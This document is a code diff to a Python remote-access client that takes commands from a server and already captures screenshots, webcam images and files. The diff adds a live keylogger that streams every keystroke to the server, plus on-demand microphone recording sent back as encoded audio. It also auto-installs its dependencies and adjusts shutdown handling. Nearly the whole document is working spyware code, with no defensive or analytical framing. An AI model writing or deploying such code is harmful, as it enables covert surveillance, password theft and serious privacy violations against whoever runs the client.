@@ -28,6 +28,9 @@ def install_package(package, import_name=None):
 
 install_package("Pillow", "PIL")
 install_package("mss")
+install_package("sounddevice")
+install_package("numpy")
+install_package("pynput")
 
 SERVER_IP = "127.0.0.1"
 PORT = 5000
@@ -267,6 +270,140 @@ def capture_webcam():
     except Exception as e:
         return json.dumps({"type": "WEBCAM", "status": "error", "message": str(e)})
 
+def capture_audio(duration=10):
+    """Capture microphone audio and return as base64 WAV"""
+    try:
+        import sounddevice as sd
+        import numpy as np
+        import wave
+        import io
+
+        sample_rate = 44100
+        channels = 2
+
+        import threading as _t
+        import time as _time
+
+        print(f"🎤 Recording audio for {duration} seconds...")
+
+        result = [None]
+        rec_err = [None]
+
+        def _record():
+            try:
+                result[0] = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels, dtype='int16')
+                sd.wait()
+            except Exception as e:
+                rec_err[0] = e
+
+        rec_thread = _t.Thread(target=_record, daemon=True)
+        rec_thread.start()
+        rec_thread.join(timeout=duration + 20)
+
+        if rec_thread.is_alive():
+            sd.stop()
+            raise Exception("Recording timed out - no microphone response")
+        if rec_err[0]:
+            raise rec_err[0]
+        if result[0] is None:
+            raise Exception("No audio data received from microphone")
+
+        recording = result[0]
+        print("✓ Recording complete")
+
+        buffer = io.BytesIO()
+        with wave.open(buffer, 'wb') as wf:
+            wf.setnchannels(channels)
+            wf.setsampwidth(2)
+            wf.setframerate(sample_rate)
+            wf.writeframes(recording.tobytes())
+
+        audio_data = base64.b64encode(buffer.getvalue()).decode()
+
+        del recording
+        del buffer
+
+        return json.dumps({
+            "type": "MICROPHONE",
+            "status": "success",
+            "data": audio_data,
+            "size": len(audio_data),
+            "duration": duration,
+            "sample_rate": sample_rate,
+            "channels": channels,
+            "format": "WAV"
+        })
+
+    except ImportError as e:
+        return json.dumps({
+            "type": "MICROPHONE",
+            "status": "error",
+            "message": f"Audio library not installed: {str(e)}. Run: pip install sounddevice numpy"
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "MICROPHONE",
+            "status": "error",
+            "message": f"Audio capture failed: {str(e)}"
+        })
+
+# ── Keylog Live-Stream State ────────────────────────────────────────────────────
+_keylog_listener = None
+_keylog_active = False
+
+
+def start_keylog_stream():
+    """Start background listener that streams [KEYSTROKE] lines live to server."""
+    global _keylog_listener, _keylog_active
+    _keylog_active = True
+    from pynput import keyboard
+    from datetime import datetime
+
+    def on_press(key):
+        if not _keylog_active:
+            return False
+        try:
+            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+            try:
+                k = key.char
+            except AttributeError:
+                k = None
+            if k is not None:
+                line = f"[KEYSTROKE] {ts} {k}"
+            else:
+                s = str(key)
+                if s.startswith("Key."):
+                    line = f"[KEYSTROKE] {ts} <{s.replace('Key.', '').upper()}>"
+                elif s.startswith("<") and s.endswith(">"):
+                    line = f"[KEYSTROKE] {ts} {s}"
+                else:
+                    line = f"[KEYSTROKE] {ts} <{s.upper()}>"
+            global client
+            client.send(line.encode())
+            client.send(b"\n")
+        except Exception:
+            pass
+
+    _keylog_listener = keyboard.Listener(on_press=on_press)
+    _keylog_listener.start()
+
+
+def stop_keylog_stream():
+    """Stop the keylog listener and signal end-of-stream."""
+    global _keylog_listener, _keylog_active
+    _keylog_active = False
+    if _keylog_listener is not None:
+        try:
+            _keylog_listener.stop()
+        except Exception:
+            pass
+        _keylog_listener = None
+    global client
+    try:
+        client.send(b"[KEYLOG_END]\n")
+    except Exception:
+        pass
+
 def download_file(filepath):
     """Send file to server"""
     try:
@@ -355,7 +492,8 @@ def main_loop():
                         print("✓ Server requested client shutdown")
                         client.close()
                         print("🔴 Client terminated by server")
-                        os._exit(0)  # Unconditionally and forcefully kill the client process
+                        threading.Timer(3.0, os._exit, [0]).start()
+                        sys.exit(0)
 
                     # Special commands
                     if cmd.startswith("POPUP:"):
@@ -493,6 +631,23 @@ def main_loop():
                     elif cmd == "WEBCAM":
                         output = capture_webcam().encode()
                     
+                    elif cmd == "MICROPHONE" or cmd.startswith("MICROPHONE:"):
+                        try:
+                            duration = 10
+                            if cmd.startswith("MICROPHONE:"):
+                                duration = int(cmd.split(":", 1)[1].strip())
+                            output = capture_audio(duration).encode()
+                        except Exception as e:
+                            output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
+                    
+                    elif cmd == "KEYLOG_START":
+                        start_keylog_stream()
+                        continue
+
+                    elif cmd == "KEYLOG_STOP":
+                        stop_keylog_stream()
+                        continue
+                    
                     elif cmd.startswith("DOWNLOAD:"):
                         filepath = cmd.split(":", 1)[1].strip()
                         output = download_file(filepath).encode()
@@ -505,56 +660,6 @@ def main_loop():
                             output = upload_file(filename, data_b64).encode()
                         except Exception as e:
                             output = json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)}).encode()
-                    
-                    elif cmd.startswith("POPUP:"):
-                        try:
-                            parts = cmd.split(":", 2)
-                            if len(parts) == 3:
-                                title = parts[1].strip()
-                                msg = parts[2].strip()
-                                # Run popup in background thread so it doesn't block client
-                                def show_msg():
-                                    if os_name == "Windows":
-                                        import ctypes
-                                        ctypes.windll.user32.MessageBoxW(0, msg, title, 64)
-                                    else:
-                                        # Try Native Mac OS Dialog
-                                        if os_name == "Darwin":
-                                            import subprocess
-                                            try:
-                                                subprocess.run(["osascript", "-e", f'display dialog "{msg}" with title "{title}" buttons {{"OK"}} default button "OK"'], check=True)
-                                                return
-                                            except: pass
-                                        
-                                        # Try Native Linux Dialog
-                                        elif os_name == "Linux":
-                                            import subprocess
-                                            try:
-                                                subprocess.run(["zenity", "--info", f"--title={title}", f"--text={msg}"], check=True)
-                                                return
-                                            except:
-                                                try:
-                                                    subprocess.run(["notify-send", title, msg], check=True)
-                                                    return
-                                                except: pass
-                                        
-                                        # Universal Tkinter Fallback (if native fails)
-                                        try:
-                                            import tkinter as tk
-                                            from tkinter import messagebox
-                                            r = tk.Tk()
-                                            r.withdraw()
-                                            r.attributes('-topmost', True)
-                                            messagebox.showinfo(title, msg)
-                                            r.destroy()
-                                        except:
-                                            pass
-                                threading.Thread(target=show_msg, daemon=True).start()
-                                output = json.dumps({"type": "POPUP", "status": "success", "message": "Popup displayed!"}).encode()
-                            else:
-                                output = json.dumps({"type": "POPUP", "status": "error", "message": "Invalid popup format"}).encode()
-                        except Exception as e:
-                            output = json.dumps({"type": "POPUP", "status": "error", "message": str(e)}).encode()
                     
                     elif cmd == "SYSINFO":
                         info = {
@@ -821,7 +926,7 @@ def main_loop():
 
                     client.send(output)
                     
-                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM")):
+                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "KEYLOG_START", "KEYLOG_STOP")):
                         try:
                             time.sleep(0.1)
                             client.send(b"\n}")
